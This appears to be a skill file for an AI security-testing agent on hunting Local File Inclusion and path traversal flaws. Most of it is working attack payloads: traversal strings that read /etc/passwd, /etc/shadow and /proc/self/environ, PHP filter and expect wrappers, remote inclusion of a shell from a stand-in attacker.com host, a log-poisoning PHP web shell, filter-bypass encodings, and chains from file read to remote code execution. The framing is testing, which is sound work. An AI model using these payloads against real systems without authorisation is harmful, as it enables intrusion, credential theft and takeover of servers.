---
name: hunt-lfi
description: "Hunting skill for Local File Inclusion (LFI) / Path Traversal vulnerabilities. Directory traversal, file read via include(), PHP wrappers, RFI, log poisoning. Use when testing endpoints that read files or templates."
---

# Hunt: Local File Inclusion / Path Traversal

## Detection Patterns

### Basic Path Traversal
```
?file=../../../etc/passwd
?page=../../../../etc/passwd
?template=../../windows/win.ini
```
Test ../ variants, URL encoding, double encoding.

### PHP Wrappers
```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/resource=/etc/passwd
```
Read PHP source code via base64-encoded filter, bypasses include() execution.

### RFI (Remote File Inclusion)
```
?page=http://attacker.com/shell.txt
?file=https://attacker.com/evil.php
```
If server includes remote URL → code execution.

### Log Poisoning
```
1. Inject payload into User-Agent: <?php system($_GET['cmd']); ?>
2. Then include: ?file=../../../var/log/apache2/access.log
```
Apache/Nginx logs are writable by HTTP request → inject PHP → include log → RCE.

### PHP Expect Wrapper (if expect module loaded)
```
?file=expect://id
?file=expect://cat /etc/passwd
```

## Payload Tables

### Unix
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### Windows
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log
```

### Bypass Techniques
```
../..//..//..//etc/passwd       (double slash)
../../../etc/passwd%00.jpg      (null byte, PHP < 5.3.4)
....//....//....//etc/passwd   (filter bypass)
..%252f..%252f..%252fetc/passwd (double URL encoding)
```

## Confirmation Gates
- File content in response → confirmed + high
- PHP filter returns base64 source → confirmed + high
- Remote shell execution → confirmed + critical

## Chain Templates
- LFI + Log Poisoning → RCE via Apache/Nginx log
- RFI + Cloud Metadata → access metadata from compromised server
- LFI + Source Code Read → SSRF to internal services (read config for URLs/credentials)
